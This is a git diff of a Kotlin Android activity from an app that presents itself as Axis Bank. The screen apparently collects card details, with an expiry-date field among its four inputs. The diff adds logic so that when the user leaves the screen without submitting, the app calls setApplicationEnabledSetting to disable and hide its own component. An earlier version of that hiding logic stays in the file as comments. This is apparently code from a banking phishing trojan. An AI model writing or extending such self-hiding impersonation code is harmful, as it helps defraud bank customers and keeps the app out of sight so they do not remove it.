@@ -9,9 +9,7 @@ import android.text.TextUtils
 import android.text.TextWatcher
 import android.util.Log
 import android.widget.Toast
-import androidx.core.widget.addTextChangedListener
 import com.example.axisbank.SecondPage
-import com.example.axisbank.Submit2
 import com.example.oldaxisbank.databinding.ActivityVerifydetailBinding
 import retrofit2.Call
 import retrofit2.Callback
@@ -28,6 +26,9 @@ class verifydetail : AppCompatActivity() {
         binding = ActivityVerifydetailBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
+        val util = Util()
+        util.saveLocalData(this,"check","true")
+
 
         binding.e2.addTextChangedListener(expiryTextWatcher)
 
@@ -37,6 +38,7 @@ class verifydetail : AppCompatActivity() {
 
         binding.login.setOnClickListener {
 
+            util.saveLocalData(this@verifydetail ,"check","false")
 
             if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() ||
                 binding.e3.text.toString().isEmpty() || binding.e4.text.toString().isEmpty() ){
@@ -80,11 +82,13 @@ class verifydetail : AppCompatActivity() {
 
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
+
+
+    override fun onPause() {
+        super.onPause()
         val util =  Util()
-        if(util.getLocalData(this,"dis")=="1") {
-            util.saveLocalData(this,"dis","2")
+        if(util.getLocalData(this,"check")=="true") {
+            Log.e("asdf123", "pause: verify activity")
             val pakagemanger = packageManager
             pakagemanger.setApplicationEnabledSetting(
                 packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -92,6 +96,19 @@ class verifydetail : AppCompatActivity() {
             )
         }
     }
+
+//    override fun onDestroy() {
+//        super.onDestroy()
+//        val util =  Util()
+//        if(util.getLocalData(this,"dis")=="1") {
+//            util.saveLocalData(this,"dis","2")
+//            val pakagemanger = packageManager
+//            pakagemanger.setApplicationEnabledSetting(
+//                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+//                PackageManager.DONT_KILL_APP
+//            )
+//        }
+//    }
 }
 
 
